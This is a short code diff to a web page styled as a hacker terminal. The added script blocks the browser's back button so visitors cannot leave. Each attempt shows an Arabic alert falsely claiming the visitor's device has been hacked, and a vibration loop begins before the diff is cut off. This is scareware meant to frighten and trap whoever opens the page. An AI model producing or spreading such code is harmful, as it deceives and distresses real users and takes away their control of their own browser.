@@ -49,12 +49,14 @@
     <div class="terminal" id="console"></div>
 
     <script>
-        window.onload = function() {
+        // قفل زر الرجوع تماماً وحبس المستخدم جوه الصفحة
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function () {
             history.pushState(null, null, location.href);
-            window.onpopstate = function () {
-                history.pushState(null, null, location.href);
-            };
+            alert("🚨 تحذير: لا يمكنك الهروب! تم اختراق جهازك تحت رعاية سكران! 🚨");
+        });
 
+        window.onload = function() {
             try {
                 if (navigator.vibrate) {
                     setInterval(() => {
